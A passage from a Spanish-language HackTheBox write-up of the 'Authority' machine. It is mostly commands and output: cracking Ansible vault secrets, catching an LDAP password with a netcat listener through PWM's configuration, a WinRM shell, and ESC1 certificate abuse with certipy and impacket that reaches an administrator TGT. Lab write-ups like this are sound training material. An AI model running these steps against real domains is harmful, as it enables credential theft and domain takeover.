+  <li>Si las probamos no nos funcionan.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme winrm 10.10.11.222 <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'Welcome1'</span>
+SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
+HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
+WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>-] authority.htb<span class="se">\a</span>dministrator:Welcome1
+</code></pre></div></div>
+
+<ul>
+  <li>Dentro de <code class="language-plaintext highlighter-rouge">default</code> encontramos lo que parecen ser hashes <a href="https://docs.ansible.com/ansible/latest/vault_guide/vault_encrypting_content.html">https://docs.ansible.com/ansible/latest/vault_guide/vault_encrypting_content.html</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>main.yml
+<span class="nt">---</span>
+pwm_run_dir: <span class="s2">""</span>
+
+pwm_hostname: authority.htb.corp
+pwm_http_port: <span class="s2">""</span>
+pwm_https_port: <span class="s2">""</span>
+pwm_https_enable: <span class="nb">true
+
+</span>pwm_require_ssl: <span class="nb">false
+
+</span>pwm_admin_login: <span class="o">!</span>vault |
+          <span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
+          32666534386435366537653136663731633138616264323230383566333966346662313161326239
+          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+          35653634376333666234613466396534343030656165396464323564373334616262613439343033
+          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+          3438
+
+pwm_admin_password: <span class="o">!</span>vault |
+          <span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
+          31356338343963323063373435363261323563393235633365356134616261666433393263373736
+          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+          38656432323830393339336231373637303535613636646561653637386634613862316638353530
+          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+          6531
+
+ldap_uri: ldap://127.0.0.1/
+ldap_base_dn: <span class="s2">"DC=authority,DC=htb"</span>
+ldap_admin_password: <span class="o">!</span>vault |
+          <span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
+          63303831303534303266356462373731393561313363313038376166336536666232626461653630
+          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+          34646237336164356438383034623462323531316333623135383134656263663266653938333334
+          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+          3764                         
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que nos hablan sobre <code class="language-plaintext highlighter-rouge">pwm_admin_login</code> si buscamos la ruta en la web existe.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/authority/1.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Nos piden credenciales supongo que la contraseña debe ser la del algún vault <a href="https://github.com/pwm-project/pwm">https://github.com/pwm-project/pwm</a>.</p>
+  </li>
+  <li>
+    <p>Vamos generar los hashes con <code class="language-plaintext highlighter-rouge">ansible2john</code> <a href="https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/">https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>vault1
+<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
+326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
+
+❯ <span class="nb">cat </span>vault2
+<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
+313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
+
+❯ <span class="nb">cat </span>vault3
+<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
+633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
+</code></pre></div></div>
+
+<ul>
+  <li>Generamos los hashes.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ansible2john vault1
+vault1:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d<span class="k">*</span>e041732f9243ba0484f582d9cb20e148<span class="k">*</span>4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
+❯ ansible2john vault2
+vault2:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5<span class="k">*</span>1dff07007e7a25e438e94de3f3e605e1<span class="k">*</span>66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
+❯ ansible2john vault3
+vault3:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93<span class="k">*</span>dfd9eec07341bac0e13c62fe1d0a5f7d<span class="k">*</span>d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
+</code></pre></div></div>
+
+<ul>
+  <li>Si los crackeamos vemos que todos tiene la misma contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hashes
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts <span class="o">(</span>ansible, Ansible Vault <span class="o">[</span>PBKDF2-SHA256 HMAC-256 512/512 AVX512BW 16x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 10000 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+<span class="o">!</span>@#<span class="nv">$%</span>^&amp;<span class="k">*</span>         <span class="o">(</span>vault2<span class="o">)</span>
+<span class="o">!</span>@#<span class="nv">$%</span>^&amp;<span class="k">*</span>         <span class="o">(</span>vault1<span class="o">)</span>
+<span class="o">!</span>@#<span class="nv">$%</span>^&amp;<span class="k">*</span>         <span class="o">(</span>vault3<span class="o">)</span>
+3g 0:00:00:53 DONE <span class="o">(</span>2024-07-10 17:56<span class="o">)</span> 0.05621g/s 745.8p/s 2237c/s 2237C/s 051790..victor2
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora que tenemos la contraseña podemos hacer el <code class="language-plaintext highlighter-rouge">decrypt</code> al <code class="language-plaintext highlighter-rouge">Vault</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pipx <span class="nb">install </span>ansible-core
+  installed package ansible-core 2.17.1, installed using Python 3.11.9
+  These apps are now globally available
+    - ansible
+    - ansible-config
+    - ansible-connection
+    - ansible-console
+    - ansible-doc
+    - ansible-galaxy
+    - ansible-inventory
+    - ansible-playbook
+    - ansible-pull
+    - ansible-test
+    - ansible-vault
+<span class="k">done</span><span class="o">!</span> ✨ 🌟 ✨
+</code></pre></div></div>
+
+<ul>
+  <li>Y tenemos credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ansible-vault decrypt vault1
+Vault password:
+Decryption successful
+❯ <span class="nb">ls</span>
+❯ ansible-vault decrypt vault2
+Vault password:
+Decryption successful
+❯ ansible-vault decrypt vault3
+Vault password:
+Decryption successful
+❯ <span class="nb">cat </span>vault1
+svc_pwm                                                                                 
+
+❯ <span class="nb">cat </span>vault2
+pWm_@dm!N_!23                                                                           
+
+❯ <span class="nb">cat </span>vault3
+DevT3st@123%            
+</code></pre></div></div>
+
+<ul>
+  <li>Si verificamos vemos que la credencial es correcta para el usuario pero no podemos listar recursos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23
+❯ cme smb 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span> <span class="nt">--shares</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>-] Error enumerating shares: STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<ul>
+  <li>Sin embargo probando otros servicios tampoco nos deja.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme winrm 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
+SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
+HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
+WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>-] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23
+❯ cme ldap 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+LDAP        10.10.11.222    445    AUTHORITY        <span class="o">[</span>-] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23 Error connecting to the domain, are you sure LDAP service is running on the target ?
+</code></pre></div></div>
+
+<ul>
+  <li>Si probamos las credenciales en el panel de login de <code class="language-plaintext highlighter-rouge">pwm</code> no nos deja entrar <a href="https://github.com/pwm-project/pwm">https://github.com/pwm-project/pwm</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/authority/2.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/authority/3.png" />
+</p>
+
+<ul>
+  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> en <code class="language-plaintext highlighter-rouge">Configuration Editor</code> nos lleva aquí.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/authority/4.png" />
+</p>
+
+<ul>
+  <li>Si pegamos la contraseña que tenemos y le damos a <code class="language-plaintext highlighter-rouge">Sign in</code> nos deja entrar.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/authority/5.png" />
+</p>
+
+<h2 id="shell-as-svc_ldap-and-user-flag">Shell as svc_ldap and user flag</h2>
+
+<ul>
+  <li>Vemos que esta el usuario <code class="language-plaintext highlighter-rouge">svc_ldap</code> y la contraseña esta guardada allí como en la parte de LDAP <code class="language-plaintext highlighter-rouge">URLs</code> nos deja agregar un <code class="language-plaintext highlighter-rouge">Value</code> podemos poner nuestra <code class="language-plaintext highlighter-rouge">ip</code> y ponernos en escucha en el puerto que opera LDAP por defecto que es el <code class="language-plaintext highlighter-rouge">389</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 389
+listening on <span class="o">[</span>any] 389 ...
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/authority/6.png" />
+</p>
+
+<ul>
+  <li>Después de la damos en <code class="language-plaintext highlighter-rouge">Save</code> y si nos vamos al <code class="language-plaintext highlighter-rouge">netcat</code> tenemos credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 389
+listening on <span class="o">[</span>any] 389 ...
+connect to <span class="o">[</span>10.10.14.74] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.222] 61273
+0Y<span class="sb">`</span>T<span class="p">;</span><span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htblDaP_1n_th3_cle4r!
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>creds.txt
+svc_ldap:lDaP_1n_th3_cle4r!
+</code></pre></div></div>
+
+<ul>
+  <li>Son correctas y nos podemos conectar con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme winrm 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
+SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
+HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
+WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> lDaP_1n_th3_cle4r!
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+802832b5ae3b3fb19108fd495fdb7232
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>Vemos un <code class="language-plaintext highlighter-rouge">.pfx</code> que es un archivo para almacenar certificados digitales y claves privadas de manera segura.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\</span>
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        4/23/2023   6:16 PM                Certs
+d-----        3/28/2023   1:59 PM                Department Shares
+d-----        3/17/2023   9:20 AM                Development
+d-----         8/9/2022   7:00 PM                inetpub
+d-----        3/24/2023   8:22 PM                PerfLogs
+d-r---        3/25/2023   1:20 AM                Program Files
+d-----        3/25/2023   1:19 AM                Program Files <span class="o">(</span>x86<span class="o">)</span>
+d-----        7/11/2024  12:24 AM                pwm
+d-r---        3/24/2023  11:27 PM                Users
+d-----        7/12/2023   1:19 PM                Windows
+<span class="nt">-a----</span>        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>Certs
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\C</span>erts&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\C</span>erts
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        4/23/2023   6:11 PM           4933 LDAPs.pfx
+</code></pre></div></div>
+
+<ul>
+  <li>Como en otras máquinas tendremos que trabajar con ADCS (Active Directory Certificate Services) <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a> podemos usar el .exe dentro de la máquina para identificar <code class="language-plaintext highlighter-rouge">templates</code> o hacerlo desde nuestra máquina de atacante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pipx <span class="nb">install </span>certipy-ad
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora buscamos por <code class="language-plaintext highlighter-rouge">templates</code> vulnerables.</p>
+  </li>
+  <li>
+    <p>Tenemos que agregar ese subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy find <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-target</span> authority.htb <span class="nt">-text</span> <span class="nt">-stdout</span> <span class="nt">-vulnerable</span>
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 37 certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 13 enabled certificate templates
+<span class="o">[!]</span> Failed to resolve: authority.authority.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ya funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy find <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-target</span> authority.htb <span class="nt">-text</span> <span class="nt">-stdout</span> <span class="nt">-vulnerable</span>
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 37 certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 13 enabled certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via CSRA
+<span class="o">[!]</span> Got error <span class="k">while </span>trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via RRP
+<span class="o">[!]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : AUTHORITY-CA
+    DNS Name                            : authority.authority.htb
+    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>AUTHORITY-CA, <span class="nv">DC</span><span class="o">=</span>authority, <span class="nv">DC</span><span class="o">=</span>htb
+    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
+    Certificate Validity End            : 2123-04-24 01:56:25+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption <span class="k">for </span>Requests     : Enabled
+    Permissions
+      Owner                             : AUTHORITY.HTB<span class="se">\A</span>dministrators
+      Access Rights
+        ManageCertificates              : AUTHORITY.HTB<span class="se">\A</span>dministrators
+                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
+                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+        ManageCa                        : AUTHORITY.HTB<span class="se">\A</span>dministrators
+                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
+                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+        Enroll                          : AUTHORITY.HTB<span class="se">\A</span>uthenticated Users
+Certificate Templates
+  0
+    Template Name                       : CorpVPN
+    Display Name                        : Corp VPN
+    Certificate Authorities             : AUTHORITY-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
+                                          PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+                                          Document Signing
+                                          IP security IKE intermediate
+                                          IP security use
+                                          KDC Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 20 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : AUTHORITY.HTB<span class="se">\D</span>omain Computers
+                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
+                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+      Object Control Permissions
+        Owner                           : AUTHORITY.HTB<span class="se">\A</span>dministrator
+        Write Owner Principals          : AUTHORITY.HTB<span class="se">\D</span>omain Admins
+                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
+        Write Dacl Principals           : AUTHORITY.HTB<span class="se">\D</span>omain Admins
+                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
+        Write Property Principals       : AUTHORITY.HTB<span class="se">\D</span>omain Admins
+                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
+    <span class="o">[!]</span> Vulnerabilities
+      ESC1                              : <span class="s1">'AUTHORITY.HTB\\Domain Computers'</span> can enroll, enrollee supplies subject and template allows client authentication
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Y bueno nos reporta ESC1 en CorpVPN <a href="https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8">https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8</a> antes de explotar eso necesitamos agregar un computer account.</p>
+  </li>
+  <li>
+    <p>Si verificamos cuantas cuentas de equipo puede crear un usuario normal sin privilegios administrativos vemos que 10 así que no tendremos problemas.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme ldap 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-M</span> MAQ
+SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+LDAPS       10.10.11.222    636    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r!
+MAQ         10.10.11.222    389    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting the MachineAccountQuota
+MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar la computadora.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-addcomputer <span class="s1">'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'</span> <span class="nt">-method</span> LDAPS <span class="nt">-computer-name</span> <span class="s1">'miguel'</span> <span class="nt">-computer-pass</span> <span class="s1">'miguel123'</span> <span class="nt">-dc-ip</span> 10.10.11.222
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added machine account miguel<span class="nv">$ </span>with password miguel123.
+</code></pre></div></div>
+
+<ul>
+  <li>Sincronizamos nuestro reloj con el del dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>ntpdate 10.10.11.222
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a obtener el certificado.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy req <span class="nt">-username</span> <span class="s1">'miguel$'</span> <span class="nt">-password</span> miguel123 <span class="nt">-ca</span> AUTHORITY-CA <span class="nt">-dc-ip</span> 10.10.11.222 <span class="nt">-template</span> CorpVPN <span class="nt">-upn</span> administrator@authority.htb <span class="nt">-dns</span> authority.htb
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully requested certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 4
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with multiple identifications
+    UPN: <span class="s1">'administrator@authority.htb'</span>
+    DNS Host Name: <span class="s1">'authority.htb'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved certificate and private key to <span class="s1">'administrator_authority.pfx'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora solicitamos el <code class="language-plaintext highlighter-rouge">hash</code> del administrador.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ certipy auth <span class="nt">-pfx</span> administrator_authority.pfx
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found multiple identifications <span class="k">in </span>certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Please <span class="k">select </span>one:
+    <span class="o">[</span>0] UPN: <span class="s1">'administrator@authority.htb'</span>
+    <span class="o">[</span>1] DNS Host Name: <span class="s1">'authority.htb'</span>
+<span class="o">&gt;</span> 0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: administrator@authority.htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
